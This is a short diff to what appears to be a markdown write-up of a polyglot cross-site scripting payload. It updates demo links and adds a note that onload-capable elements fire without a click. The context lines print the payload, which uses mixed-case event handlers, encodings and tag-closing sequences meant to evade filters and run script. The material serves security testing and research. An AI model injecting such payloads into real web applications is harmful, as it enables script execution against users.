@@ -59,7 +59,7 @@ _Demo: <https://jsbin.com/zizuvad>_
 <img border=3 alt=jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e>
 
 ```
-_Demo: <https://jsbin.com/gopavuz>_
+_Demo: <https://jsbin.com/gopavuz> (note that the click is not necessary with elements that support the `onload` event handler.)_
 * __`href`/`xlink:href` and `src` attributes with HTML-escaped values:__
 ```html
 <a href="
@@ -241,7 +241,7 @@ void 'javascript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0
 
 "></svg>
 ```
-_Demo: <https://jsbin.com/kazoniwugo>_
+_Demo: <https://jsbin.com/puboha>_
 ## Filter evasion:
 As you might have already noticed, the polyglot has been crafted with filter evasion in mind. For instance:
 
